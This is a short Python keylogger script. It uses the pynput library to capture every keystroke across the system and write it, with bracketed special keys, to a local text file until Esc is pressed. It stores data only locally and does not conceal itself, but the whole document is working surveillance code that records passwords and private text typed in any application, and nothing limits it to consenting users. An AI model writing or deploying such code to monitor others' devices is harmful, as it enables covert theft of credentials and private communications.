from pynput import keyboard

# Open the file where the typed content will be stored
with open("typed_content.txt", "a") as file:

    # Define a function to capture key presses
    def on_press(key):
        try:
            # Write the character of the key pressed to the file
            file.write(key.char)
            file.flush()  # Ensure the content is written immediately
        except AttributeError:
            # Handle special keys like Enter, Shift, etc.
            if key == keyboard.Key.space:
                file.write(" ")  # Add a space for the space bar
            elif key == keyboard.Key.enter:
                file.write("\n")  # Add a new line for Enter key
            elif key == keyboard.Key.tab:
                file.write("\t")  # Add a tab for the Tab key
            else:
                file.write(f"[{key}]")  # Log special keys like Shift, Esc, etc.
            file.flush()  # Ensure the content is written immediately

    # Define a function to stop the listener when 'esc' is pressed
    def on_release(key):
        if key == keyboard.Key.esc:
            # Stop the listener if 'esc' is pressed
            return False

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

print("Key logging stopped.")
